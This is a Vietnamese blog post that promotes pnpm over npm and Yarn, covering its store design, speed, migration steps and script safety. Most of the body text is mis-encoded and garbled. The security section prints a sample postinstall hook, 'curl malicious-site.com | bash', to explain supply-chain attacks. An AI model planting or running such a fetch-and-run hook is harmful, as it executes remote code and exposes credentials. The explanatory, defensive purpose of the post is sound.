---
title: "PNPM â€“ Khi Dev KhÃ´ng Cáº§n Pháº£i Chá» NPM â€œÄ‘i chá»£â€ GiÃºp MÃ¬nh Ná»¯a"
description: "Bài viết thực chiến về PNPM so với NPM/Yarn: cơ chế store, vì sao cài đặt nhanh và tiết kiệm dung lượng, cùng lưu ý khi chuyển đổi."
pubDate: "2025-10-29"
published: true
tags: ["pnpm", "npm", "tooling", "package manager"]
slug: "pnpm-khi-dev-khong-can-cho-npm-di-cho-giup-minh-nua"
author: "Hien Nguyen"
ogTitle: "PNPM â€“ Khi Dev KhÃ´ng Cáº§n Pháº£i Chá» NPM Ä‘i chá»£ GiÃºp MÃ¬nh Ná»¯a"
ogDescription: "PNPM vs NPM/Yarn theo góc nhìn thực tế: store hoạt động ra sao, tốc độ tăng thế nào, ổ đĩa gọn hơn bao nhiêu và lưu ý khi chuyển đổi."
pairSlug:
  en: "pnpm-when-devs-stop-waiting-for-npm"
---

# âš¡ PNPM â€“ Khi Dev KhÃ´ng Cáº§n Pháº£i Chá» NPM â€œÄi Chá»£â€ Ná»¯a

> â€œnpm installâ€ mÃ  quáº¡t CPU gÃ o rÃº, disk sáº¯p ná»• tung â€” thÃ¬ Ä‘Ã£ Ä‘áº¿n lÃºc báº¡n thá»­ **pnpm**.

---

## ðŸ§© CÃ¢u Chuyá»‡n Quen Thuá»™c

Báº¡n clone má»™t repo, cháº¡y lá»‡nh:

```bash
npm install
```

VÃ  rá»“i... chá».  
Chá» mÃ£i.  
Chá» hoÃ i.

Rá»“i báº¡n thá»­ **Yarn**, tháº¥y nhanh hÆ¡n tÃ­, nhÆ°ng váº«n pháº£i táº£i cÃ¹ng má»™t package 10 láº§n cho 10 dá»± Ã¡n khÃ¡c nhau.  
á»” cá»©ng ngÃ y cÃ ng phÃ¬nh to, thÆ° má»¥c `node_modules` náº·ng cáº£ GB, vÃ  CI thÃ¬ cháº¡y cháº­m nhÆ° rÃ¹a bÃ².

ÄÃ³ lÃ  bá»©c tranh trÆ°á»›c khi **pnpm** xuáº¥t hiá»‡n.

---

## ðŸš€ PNPM KhÃ¡c Biá»‡t NhÆ° Tháº¿ NÃ o Vá»›i NPM VÃ  Yarn?

TÃ³m gá»n: **pnpm sá»­ dá»¥ng cÃ¡ch lÆ°u dependency hoÃ n toÃ n khÃ¡c biá»‡t.**

| CÆ¡ Cháº¿          | NPM / Yarn                            | PNPM                                                                    |
| --------------- | ------------------------------------- | ----------------------------------------------------------------------- |
| CÃ¡ch LÆ°u        | Copy riÃªng package cho tá»«ng dá»± Ã¡n     | Sá»­ dá»¥ng **global content-addressable store**, chá»‰ **symlink** vÃ o dá»± Ã¡n |
| Dung LÆ°á»£ng Disk | Náº·ng, láº·p dá»¯ liá»‡u                     | Ráº¥t nháº¹, tiáº¿t kiá»‡m á»• cá»©ng                                               |
| Tá»‘c Äá»™ CÃ i Äáº·t  | BÃ¬nh thÆ°á»ng                           | **Nhanh hÆ¡n 2â€“3 láº§n** (nhá» cache + hard link)                           |
| Quáº£n LÃ½ Version | Theo tá»«ng dá»± Ã¡n                       | SiÃªu chÃ­nh xÃ¡c nhá» **strict symlink resolution**                        |
| Báº£o Máº­t Script  | **Tá»± Ä‘á»™ng cháº¡y `postinstall` script** | **KhÃ´ng tá»± Ä‘á»™ng cháº¡y trá»« khi explicit**                                 |

---

## ðŸ”’ Báº£o Máº­t â€“ Äiá»ƒm LÃ m PNPM Thá»±c Sá»± â€œÄÃ¡ng Tiá»nâ€

ÄÃ¢y lÃ  pháº§n mÃ  nhiá»u dev **chÆ°a chÃº Ã½ nhÆ°ng cá»±c ká»³ quan trá»ng**.

### âŒ Váº¥n Äá» Cá»§a NPM/Yarn:

Khi cháº¡y `npm install` hoáº·c `yarn install`,  
cÃ¡c package cÃ³ thá»ƒ **tá»± Ä‘á»™ng cháº¡y script** nhÆ°:

```json
"scripts": {
  "postinstall": "curl malicious-site.com | bash"
}
```

Náº¿u khÃ´ng kiá»ƒm soÃ¡t ká»¹ hoáº·c CI khÃ´ng sandbox, báº¡n vá»«a má»Ÿ cá»­a cho mÃ£ Ä‘á»™c cháº¡y trÃªn mÃ¡y mÃ¬nh. Gáº§n Ä‘Ã¢y, cÃ¡c vá»¥ lá»«a Ä‘áº£o kiá»ƒu nÃ y diá»…n ra thÆ°á»ng xuyÃªn: dev pull source Node.js tá»« repo láº¡ (thÆ°á»ng qua bÃ i test hoáº·c bÃ i táº­p), cháº¡y `npm i` lÃ  "toang" â€“ mÃ£ Ä‘á»™c tá»± cháº¡y, quÃ©t env variables Ä‘á»ƒ steal API keys, GitHub tokens, AWS credentials, tháº­m chÃ­ lan truyá»n nhÆ° worm. VÃ­ dá»¥, thÃ¡ng 9/2025, má»™t loáº¡t package phá»• biáº¿n nhÆ° chalk, debug bá»‹ compromise, dáº«n Ä‘áº¿n hÃ ng trÄƒm package khÃ¡c bá»‹ nhiá»…m, Ä‘Ã¡nh cáº¯p credentials tá»« mÃ´i trÆ°á»ng dev. Worm "Shai-Hulud" Ä‘Ã£ tá»± replicate, áº£nh hÆ°á»Ÿng hÃ ng triá»‡u install, khiáº¿n bao nhiÃªu key vÃ  tÃ i khoáº£n bay mÃ u chá»‰ vÃ¬ scripts auto-run. ÄÃ¢y lÃ  **vector táº¥n cÃ´ng phá»• biáº¿n** (supply chain attack), Ä‘áº·c biá»‡t vá»›i dev má»›i hoáº·c team khÃ´ng audit dependencies.

### âœ… PNPM Xá»­ LÃ½ ThÃ´ng Minh HÆ¡n:

- **KhÃ´ng tá»± Ä‘á»™ng cháº¡y script**, trá»« khi báº¡n **explicitly cho phÃ©p**.
- CÃ³ thá»ƒ báº­t `--ignore-scripts` máº·c Ä‘á»‹nh trong `.npmrc`:
  ```bash
  pnpm install --ignore-scripts
  ```
- GiÃºp **ngÄƒn cháº·n code Ä‘á»™c háº¡i** tá»« dependency bÃªn thá»© ba ngay tá»« Ä‘áº§u â€“ pull repo láº¡ vá», cháº¡y `pnpm i` thÃ¬ mÃ£ Ä‘á»™c náº±m im, khÃ´ng steal keys hay lan truyá»n.
- NgoÃ i ra, pnpm sandbox hÃ³a `node_modules`, háº¡n cháº¿ **module A override module B** â€” cÃ¡c kiá»ƒu táº¥n cÃ´ng nhÆ° _prototype pollution_ hay _dependency shadowing_ gáº§n nhÆ° biáº¿n máº¥t.

> ðŸ§  NÃ³i cÃ¡ch khÃ¡c: pnpm cÃ i package, nhÆ°ng khÃ´ng â€œtin tÆ°á»Ÿng mÃ¹ quÃ¡ngâ€ package Ä‘Ã³ â€“ lÃ½ tÆ°á»Ÿng Ä‘á»ƒ trÃ¡nh nhá»¯ng vá»¥ "toang" tÃ i khoáº£n gáº§n Ä‘Ã¢y.

---

## ðŸ§  TÆ° Duy Thiáº¿t Káº¿ KhÃ¡c Biá»‡t

### 1ï¸âƒ£ â€œGlobal Storeâ€ â€“ á»” ÄÄ©a ThÃ´ng Minh

PNPM cÃ³ má»™t nÆ¡i lÆ°u trá»¯ toÃ n cá»¥c (máº·c Ä‘á»‹nh: `~/.pnpm-store`).  
Má»—i package chá»‰ tá»“n táº¡i **má»™t báº£n duy nháº¥t** â€” cÃ¡c dá»± Ã¡n chá»‰ â€œlinkâ€ tá»›i Ä‘Ã³.

```bash
# Láº§n Ä‘áº§u
pnpm install

# Láº§n sau (vá»›i dá»± Ã¡n khÃ¡c)
pnpm install   # Gáº§n nhÆ° tá»©c thÃ¬, vÃ¬ package Ä‘Ã£ cÃ³ sáºµn
```

### 2ï¸âƒ£ â€œStrict Linkingâ€ â€“ KhÃ´ng Äá»ƒ Dependency TrÃ n Lan

PNPM táº¡o `node_modules` theo cáº¥u trÃºc â€œvirtual storeâ€ riÃªng:  
Dependency chá»‰ access Ä‘Æ°á»£c nhá»¯ng gÃ¬ khai bÃ¡o trong `package.json`.  
Äiá»u nÃ y giÃºp:

- TrÃ¡nh lá»—i â€œhidden dependencyâ€ (import module khÃ´ng khai bÃ¡o).
- Build reproducible, CI khÃ´ng lo â€œcháº¡y tá»‘t trÃªn mÃ¡y A, fail trÃªn mÃ¡y Bâ€.

---

## ðŸ§° Migration Nhanh Gá»n

Náº¿u dá»± Ã¡n Ä‘ang dÃ¹ng NPM/Yarn:

```bash
npm install -g pnpm
# Hoáº·c dÃ¹ng corepack (Node 18+)
corepack enable pnpm
```

Chuyá»ƒn sang dÃ¹ng:

```bash
pnpm install
pnpm run dev
```

Táº¥t cáº£ script vÃ  config váº«n hoáº¡t Ä‘á»™ng bÃ¬nh thÆ°á»ng.  
Báº¡n sáº½ tháº¥y tá»‘c Ä‘á»™ khÃ¡c biá»‡t ngay tá»« láº§n Ä‘áº§u.

---

## âš–ï¸ Khi NÃ o ChÆ°a Cáº§n Vá»™i Chuyá»ƒn Sang PNPM?

- Team Ä‘ang dÃ¹ng **workspace Yarn 1 + custom plugin** â€” cáº§n test ká»¹.
- Há»‡ thá»‘ng CI/CD cÅ© chÆ°a há»— trá»£ pnpm cache.
- Má»™t sá»‘ tool (hiáº¿m) váº«n assume cáº¥u trÃºc `node_modules` truyá»n thá»‘ng.

Tuy nhiÃªn, vá»›i **Node 18+ vÃ  corepack**, viá»‡c dÃ¹ng pnpm giá» Ä‘Ã£ cá»±c ká»³ mÆ°á»£t mÃ .  
Cáº£ Vercel, Turborepo, NX, Cloudflare Workers Ä‘á»u há»— trá»£ sáºµn.

---

## ðŸ’¬ Tá»•ng Káº¿t

|                 | NPM               | Yarn         | PNPM                                |
| --------------- | ----------------- | ------------ | ----------------------------------- |
| Tá»‘c Äá»™          | ðŸ¢                | âš¡           | ðŸš€                                  |
| Dung LÆ°á»£ng Disk | Náº·ng              | Trung bÃ¬nh   | Ráº¥t nháº¹                             |
| An ToÃ n Script  | Cháº¡y tá»± Ä‘á»™ng      | Cháº¡y tá»± Ä‘á»™ng | **KhÃ´ng auto-run**                  |
| Cache ToÃ n Cá»¥c  | âŒ                | âœ… (partial) | âœ… (full)                           |
| Isolation       | Tháº¥p              | Trung bÃ¬nh   | **Cao (symlink isolation)**         |
| PhÃ¹ Há»£p Vá»›i     | Má»i dá»± Ã¡n nhá»/lá»›n | Trung bÃ¬nh   | **Dev chuyÃªn nghiá»‡p / CI hiá»‡n Ä‘áº¡i** |

---

## ðŸ”— TÃ i Liá»‡u ChÃ­nh Thá»©c

- [pnpm.io](https://pnpm.io)
- [Cáº¥u trÃºc store cá»§a pnpm](https://pnpm.io/symlinked-node-modules-structure)
- [Corepack & pnpm setup](https://nodejs.org/api/corepack.html)

---

âœï¸ _Viáº¿t bá»Ÿi má»™t dev tá»«ng tháº¥y `node_modules` náº·ng hÆ¡n cáº£ source code.  
Giá» á»• cá»©ng sáº¡ch sáº½, build nhanh chÃ³ng, CI Ãªm ru â€“ nhá» pnpm._

